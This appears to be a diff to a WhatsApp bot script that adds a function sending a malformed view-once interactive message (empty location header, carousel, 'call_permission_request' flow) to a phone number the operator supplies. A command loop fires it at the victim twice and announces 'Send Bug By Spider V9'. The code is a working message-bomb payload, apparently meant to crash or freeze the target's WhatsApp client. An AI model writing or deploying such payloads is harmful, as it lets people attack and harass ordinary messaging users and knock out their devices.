@@ -671,7 +671,39 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 			}
 		}
 		
+async function ZnXIvS(target, Ptcp = true) {
+   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+    viewOnceMessage: {
+     message: {
+      interactiveMessage: {
+       header: {
+        title: "",
+        locationMessage: {},
+        hasMediaAttachment: true
+       },
+       body: {
+        text: "guru"
+       },
+       nativeFlowMessage: {
+        name: "call_permission_request",
+        messageParamsJson: " Spider〽️ "
+       },
+       carouselMessage: {}
+      }
+     }
+    }
+   }), {
+    userJid: target,
+    quoted: Qrad
+   });
 
+   await sam.relayMessage(target, etc.message, Ptcp ? {
+    participant: {
+     jid: target
+    }
+   } : {});
+   console.log(chalk.green("Send Bug By Spider V9〽️"));
+  };
 //================================================//
 async function crtVid(url) {
     const { videoMessage } = await generateWAMessageContent({
@@ -771,7 +803,7 @@ if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
-await InVisiXz(target, sam, cct = true, ptcp = true)
+await ZnXIvS(target, sam, cct = true, ptcp = true)
 }
 reply(`⫹𝐒𝐏𝐈𝐃𝐄𝐑 𝐔𝐓𝐈𝐋𝐈𝐒𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐅𝐔𝐋⫺
 
